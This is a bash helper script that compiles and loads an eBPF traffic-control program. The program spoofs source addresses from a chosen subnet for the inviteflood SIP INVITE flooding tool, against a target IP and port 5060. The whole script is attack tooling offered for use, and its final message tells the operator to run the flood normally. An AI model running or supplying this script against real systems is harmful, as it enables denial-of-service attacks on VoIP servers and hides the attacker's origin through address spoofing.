#!/usr/bin/env bash
# Setup eBPF spoofing for inviteflood attack
# Usage: ./setup_inviteflood_spoof.sh <interface> <target_ip> <spoofed_subnet>
# Example: ./setup_inviteflood_spoof.sh wlan0 143.53.142.93 10.10.123.0/24

set -euo pipefail

if [ $# -lt 3 ]; then
  echo "Usage: $0 <interface> <target_ip> <spoofed_subnet> [target_port] [source_port]"
  echo "Example: $0 wlan0 143.53.142.93 10.10.123.0/24 5060 4000"
  exit 1
fi

IFACE="$1"
TARGET_IP="$2"
SPOOFED_SUBNET="$3"
TARGET_PORT="${4:-5060}"  # Default SIP port
SOURCE_PORT="${5:-0}"     # 0 means any source port

echo "Setting up eBPF spoofing for inviteflood attack..."
echo "Interface: $IFACE"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Spoofed subnet: $SPOOFED_SUBNET"
echo "Source port filter: $SOURCE_PORT (0=any)"

# Check if we need to compile first
if [ ! -f spoof_kern.o ] || [ spoof_kern.c -nt spoof_kern.o ]; then
    echo "Compiling eBPF program..."
    clang -O2 -g -target bpf -c spoof_kern.c -o spoof_kern_temp.o
    sudo mv spoof_kern_temp.o spoof_kern.o
fi

# Call the main load script
./load_tc_spoofer.sh "$IFACE" "$TARGET_IP" "$TARGET_PORT" "$SPOOFED_SUBNET" "$SOURCE_PORT"

echo ""
echo "eBPF spoofing is now active!"
echo "Run your inviteflood command normally - packets will be automatically spoofed."
echo ""
echo "To stop spoofing, run: ./unload_tc_spoofer.sh $IFACE"
